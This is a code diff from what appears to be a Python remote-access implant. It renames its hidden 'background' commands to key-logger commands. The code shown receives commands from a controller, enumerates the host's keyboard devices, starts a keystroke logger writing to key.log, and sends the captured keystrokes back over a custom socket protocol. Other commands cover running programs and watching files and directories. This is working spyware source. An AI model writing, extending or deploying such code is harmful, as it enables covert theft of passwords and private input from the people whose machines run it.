@@ -35,8 +35,8 @@ CMD_RUN_PROGRAM = 4
 CMD_REQUEST_FILE = 5
 CMD_WATCH_FILE = 6
 CMD_WATCH_DIR = 7
-CMD_RUN_BG = 8
-CMD_STOP_BG = 9
+CMD_RUN_KL = 8
+CMD_STOP_KL = 9
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
@@ -1094,8 +1094,7 @@ def send_file(ctx: Context):
         send_socket.close()
 
 
-def run_bg(ctx: Context):
-    """CMD_RUN_BG: Send device list, receive choice, start logger"""
+def run_kl(ctx: Context):
     if not ctx.connected_to:
         return
     source_ip = detect_source_ip(ctx.connected_to)
@@ -1113,24 +1112,24 @@ def run_bg(ctx: Context):
         from keys import list_devices_for_remote, start_logger
 
         device_list_text, devices = list_devices_for_remote()
-        print(f"[BG] Sending {len(devices)} keyboard options to hosta...")
+        print(f"[KL] Sending {len(devices)} keyboard options to hosta...")
 
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
         if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                         ctx.connected_to, ctx.key,
                                         device_list_text.encode("utf-8")):
-            print("[BG] Failed to send device list")
+            print("[KL] Failed to send device list")
             return
 
-        print("[BG] Waiting for device selection...")
+        print("[KL] Waiting for device selection...")
 
         choice_bytes = receive_byte_stream_chunked(
             recv_socket, send_socket, source_ip, ctx.connected_to,
             ctx.key, 60
         )
         if choice_bytes is None:
-            print("[BG] Choice receive failed")
+            print("[KL] Choice receive failed")
             return
 
         try:
@@ -1138,30 +1137,29 @@ def run_bg(ctx: Context):
             if 0 <= choice < len(devices):
                 # Set the module-level logger_device
                 keys.logger_device = devices[choice]
-                print(f"[BG] Selected: {devices[choice].path} - {devices[choice].name}")
+                print(f"[KL] Selected: {devices[choice].path} - {devices[choice].name}")
                 start_logger("key.log")
-                print("[BG] Logger started successfully")
+                print("[KL] Logger started successfully")
             else:
-                print(f"[BG] Invalid choice {choice}")
+                print(f"[KL] Invalid choice {choice}")
         except ValueError as e:
-            print(f"[BG] Invalid choice format: {e}")
+            print(f"[KL] Invalid choice format: {e}")
         except Exception as e:
-            print(f"[BG] Choice error: {e}")
+            print(f"[KL] Choice error: {e}")
 
     finally:
         recv_socket.close()
         send_socket.close()
 
 
-def stop_bg(ctx: Context):
-    """CMD_STOP_BG: Stop logger + send log back using same protocol"""
+def stop_kl(ctx: Context):
     if not ctx.connected_to:
         return
 
     import keys
     from keys import stop_logger, get_key_log_content
     
-    print("Stopping background logger...")
+    print("Stopping key logger...")
     stop_logger()
 
     source_ip = detect_source_ip(ctx.connected_to)
@@ -1177,14 +1175,14 @@ def stop_bg(ctx: Context):
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
         log_content = get_key_log_content("key.log")
-        print(f"[BG] Sending log ({len(log_content)} bytes)...")
+        print(f"[KL] Sending log ({len(log_content)} bytes)...")
 
         if send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                     ctx.connected_to, ctx.key,
                                     log_content.encode("utf-8")):
-            print("[BG] Log sent successfully")
+            print("[KL] Log sent successfully")
         else:
-            print("[BG] Log send failed")
+            print("[KL] Log send failed")
     finally:
         recv_socket.close()
         send_socket.close()
@@ -1330,12 +1328,12 @@ if __name__ == "__main__":
             elif command_code == CMD_WATCH_DIR:
                 print("\nStarting directory watch...")
                 _watch_and_stream(ctx, recursive=True)
-            elif command_code == CMD_RUN_BG:
-                print("\nStarting background function...")
-                run_bg(ctx)
-            elif command_code == CMD_STOP_BG:
-                print("\nStopping background function...")
-                stop_bg(ctx)
+            elif command_code == CMD_RUN_KL:
+                print("\nStarting key logger...")
+                run_kl(ctx)
+            elif command_code == CMD_STOP_KL:
+                print("\nStopping key logger...")
+                stop_kl(ctx)
             else:
                 print(f"Ignoring unknown command code {command_code}.")
 
